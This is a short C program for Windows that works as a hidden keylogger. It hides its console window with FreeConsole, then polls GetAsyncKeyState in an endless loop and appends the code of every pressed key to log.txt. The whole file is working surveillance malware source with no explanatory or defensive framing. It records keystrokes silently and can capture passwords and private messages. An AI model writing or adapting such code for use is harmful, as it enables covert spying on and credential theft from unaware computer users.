#include <stdio.h>
#include <windows.h>
#include <time.h>

#define FILE_NAME "log.txt"

main() {
	
	FreeConsole();
	
	FILE *file = fopen(FILE_NAME, "a");
	fclose(file);
	
	short ch, i;
	while (1) {
		ch = 1;
		while (ch < 250) {
			for ( i = 0; i < 50; i++, ch++) {
				if (GetAsyncKeyState(ch) == -32767) {
					file = fopen(FILE_NAME, "a");
					fprintf(file, "%d", ch);
					fclose(file);
				}
			}
			Sleep(1);
		}
	}
}
